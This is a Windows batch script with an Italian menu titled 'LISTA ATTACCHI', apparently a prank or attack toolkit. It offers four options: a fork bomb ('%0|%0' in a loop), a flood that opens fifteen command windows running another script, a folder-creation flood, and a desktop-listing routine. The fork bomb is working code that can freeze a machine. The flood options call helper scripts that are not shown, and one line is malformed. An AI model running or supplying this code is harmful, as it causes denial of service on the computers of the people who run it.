@echo off 
chcp 65001 >nul
:start                                                                    	                                                                      
cls
echo.                                                                                                                                        
echo	▒█████    ███▄ ▄███▓ ▓█████   ▄████   ▄▄▄      
echo	▒██▒  ██▒ ▓██▒▀█▀ ██ ▒▓█   ▀  ██▒ ▀█ ▒▒████▄    
echo	▒██░  ██▒ ▓██    ▓██ ░▒███   ▒██░▄▄▄ ░▒██  ▀█▄  
echo	▒██   ██░ ▒██    ▒██  ▒▓█  ▄ ░▓█  ██ ▓░██▄▄▄▄██ 
echo	░ ████▓▒░ ▒██▒   ░██ ▒░▒████▒░▒▓███  ▒ ▓█   ▓██▒
echo	░ ▒░▒░▒░  ░ ▒░   ░  ░░░ ▒░ ░ ░▒   ▒    ▒▒   ▓▒█░
echo	░ ▒ ▒░ ░   ░      ░ ░ ░  ░  ░   ░    ▒   ▒▒ ░
echo	░ ░ ░ ▒   ░      ░      ░   ░ ░    ░   ░   ▒   
echo		░ ░         ░      ░  ░      ░       ░  ░                                                                                                                                                 
echo.
echo.
echo========================================================                                                                                                                                          
echo SCRIPT MADE BY xALPHAx
echo LISTA ATTACCHI
echo [1] Ciccio Flood
echo [2] Folders Flood
echo [3] Fork Bomb
echo [4] Desktop madness	
SET /P ANSWER=Attacco desiderato? 
echo Hai scelto: %ANSWER%
echo.
IF "%ANSWER%"=="1" goto :c
IF "%ANSWER%"=="2" goto :f
IF "%ANSWER%"=="3" goto :b
IF "%ANSWER%"=="4" goto :getdesktopname
pause
echo Scelta non valida.
goto :start

:c
for /l %%i in (1,1,15) do start cmd /k Ciccio_flood.bat
pause
goto:end

:f
md %random&
start folder.bat
goto:end

:b
%0|%0
goto:b

:getdesktopname
for %%d in (%USERPROFILE%\Desktop\*.lnk) do echo %%d
for /d %%a in (%USERPROFILE%\Desktop\*) do echo %%a
pause


:end
